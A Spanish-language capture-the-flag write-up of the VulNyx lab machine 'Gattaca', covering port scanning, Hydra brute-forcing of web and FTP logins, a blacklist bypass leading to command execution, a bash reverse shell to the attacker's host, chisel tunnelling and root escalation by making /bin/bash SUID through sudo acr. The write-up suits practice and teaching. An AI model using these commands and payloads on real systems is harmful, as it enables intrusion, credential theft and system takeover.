# Gattaca — VulNyx (Write-up)

> **Autor original:** suraxddq · Publicado el 11 de mayo de 2024. Máquina de dificultad **Hard**, basada en Linux. _(Documento reformateado a markdown. Logs muy repetitivos de Hydra recortados por legibilidad; se conservan las líneas relevantes.)_

---

## Reconocimiento

Empezamos con un escaneo de puertos una vez tenemos la IP de la máquina, que en mi caso es `192.168.0.114`.

```bash
sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 192.168.0.114
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:E8:A1:F0 (Oracle VirtualBox virtual NIC)
```

Solo el puerto **80**. Lanzamos scripts y detección de versión con `-sCV`:

```bash
sudo nmap -sCV -p80 192.168.0.114
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Gattaca
|_http-server-header: Apache/2.4.57 (Debian)
```

Nota: el escaneo resuelve el host como `gat3.lan`.

### Fuzzing de directorios

Usamos `feroxbuster` para buscar archivos y carpetas:

```bash
feroxbuster --url http://192.168.0.114 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

Resultados relevantes:

```
401  GET   http://192.168.0.114/cards.php
301  GET   http://192.168.0.114/cards => .../cards/
200  GET   http://192.168.0.114/cards/guanine.txt   (0 bytes)
200  GET   http://192.168.0.114/cards/adenine.txt   (0 bytes)
200  GET   http://192.168.0.114/cards/thymine.txt   (0 bytes)
200  GET   http://192.168.0.114/about.html
200  GET   http://192.168.0.114/index.html
```

Tenemos un `cards.php` protegido con **Basic Auth** (401) y una carpeta `cards/` con 4 ficheros vacíos.

---

## Basic Auth Bruteforce

Sin más pistas, tiramos fuerza bruta con `hydra` sobre `cards.php`:

```bash
hydra -C Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  http-get://192.168.0.114/cards.php -VI -f
```

```
[80][http-get] host: 192.168.0.114   login: admin   password: admin12345
[STATUS] attack finished for 192.168.0.114 (valid pair found)
```

Credenciales válidas → `admin:admin12345`.

---

## LFI con bypass de blacklist → RCE

Entramos y vemos el contenido. Al pedir una carta como `adenine.txt` no vemos nada; pensamos en un posible **LFI**, pero parece haber algún tipo de **blacklist**.

Miramos el propio `cards.php` para ver el código. Lo que observamos es que el fichero se lee a través del binario `cat` y que existe una blacklist, **pero solo cuando la petición es POST**. Así que mandamos la petición por **GET** para saltárnosla.

Como esto se ejecuta con `shell_exec`, conseguimos **RCE**.

### Enumeración de procesos

Aprovechando el LFI/RCE, revisamos qué procesos corren en el servidor leyendo `/proc/$i/cmdline`:

```bash
for i in {1..1000}; do
  curl -su "admin:admin12345" "192.168.0.114/cards.php?filename=/proc/$i/cmdline" --output $i
  cat $i | grep -a guanine | cut -d ">" -f9
done 2>/dev/null
```

Salida (procesos destacados):

```
/sbin/init
/usr/sbin/cron -f
/usr/sbin/vsftpd /etc/vsftpd.conf
/usr/sbin/apache2 -k start
...
```

Vemos que hay un **vsftpd** corriendo (servidor FTP), dato clave para más adelante.

---

## Reverse shell como www-data

Teniendo RCE, nos lanzamos una reverse shell. Levantamos un servidor HTTP en Python sirviendo un fichero `s`, un listener con netcat, y disparamos la petición desde BurpSuite.

```bash
cat s
# /bin/bash -i >& /dev/tcp/192.168.0.160/1234 0>&1

python3 -m http.server 80
nc -vnlp 1234
```

Lanzamos la petición HTTP y entramos como **www-data**:

```
connect to [192.168.0.160] from (UNKNOWN) [192.168.0.114] 59502
www-data@gattaca:/var/www/gattaca$
```

---

## Pivoting hacia i.cassini (FTP)

En el directorio anterior encontramos `ftppolicy.txt`:

```bash
www-data@gattaca:/var/www$ cat ftppolicy.txt
```

```
** IMPORTANT **
Remember, when changing your password it must contain these requirements:

1. Must be 8 characters or longer
2. Must contain numbers
3. Must contain special characters

Don't waste time with v.freeman and rockyou.txt
```

Esto nos indica que el objetivo es **i.cassini** (no `v.freeman`) y que `rockyou.txt` no servirá. Tras varias vueltas creando diccionarios, recurrimos a **cupp**, que genera un diccionario a partir de datos de la víctima:

```bash
python cupp.py -i
```

```
> First Name: irene
> Surname: cassini
> Nickname: i.cassini
> Company name: gattaca
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]: y
> Leet mode? Y/[N]: y

[+] Saving dictionary to irene.txt, counting 7964 words.
```

### Túnel del FTP local con chisel

El FTP solo escucha en local (`127.0.0.1:21`), así que lo traemos con **chisel** (reverse). Se comprueba que con `suForce` la contraseña correcta pasa de largo, por eso vamos por FTP.

```bash
# En el atacante (servidor)
./chisel_1.7.4_linux_amd64 server -p 1234 --reverse

# En la víctima (cliente)
./chisel_1.7.4_linux_amd64 client 192.168.0.160:1234 R:21:127.0.0.1:21
```

Ahora atacamos el FTP local con Hydra usando el diccionario de cupp:

```bash
hydra -l i.cassini -P ~/username-anarchy/cupp/irene.txt 127.0.0.1 ftp -VI -f -t 64
```

```
[21][ftp] host: 127.0.0.1   login: i.cassini   password: 1r3n3!$%
[STATUS] attack finished for 127.0.0.1 (valid pair found)
```

Contraseña de i.cassini → `1r3n3!$%`.

---

## Escalada de privilegios — binario `acr`

Escalamos al usuario y revisamos `sudo -l`:

```bash
www-data@gattaca:/var/www/gattaca$ su i.cassini
i.cassini@gattaca:~$ sudo -l
```

```
User i.cassini may run the following commands on gattaca:
    (ALL : ALL) NOPASSWD: /usr/bin/acr
```

Podemos ejecutar `/usr/bin/acr` como root sin contraseña. Leyendo el `man` del binario, con la flag `-d` podemos leer archivos (aunque devuelva error), lo que ya nos da lectura de la flag de root:

```bash
i.cassini@gattaca:~$ sudo /usr/bin/acr -d /root/root.txt
```

```
acr: parsing '/root/root.txt'
0001 | bd1061ef36aca528a49f69c00f1feb66
     |   env bd1061ef36aca528a49f69c00f1feb66
...
```

### Escalada completa a root

La vía para escalar a root es abusar de que `acr` procesa un `Makefile`:

```bash
i.cassini@gattaca:~$ touch Makefile && chmod +x Makefile
i.cassini@gattaca:~$ echo "chmod 4777 /bin/bash" > Makefile
i.cassini@gattaca:~$ sudo /usr/bin/acr -r Makefile
error: this is not an acr generated configure script.
i.cassini@gattaca:~$ bash -p
bash-5.2# whoami; hostname; cut -c 1-5 root.txt
root
gattaca
bd106
```

Aunque `acr -r` devuelve un error, ejecuta el `Makefile` como root, dejando `/bin/bash` con SUID (`chmod 4777`). Con `bash -p` mantenemos privilegios y somos **root**.

---

_Write-up de la máquina **Gattaca** (VulNyx, dificultad Hard). Autoría original: **suraxddq**._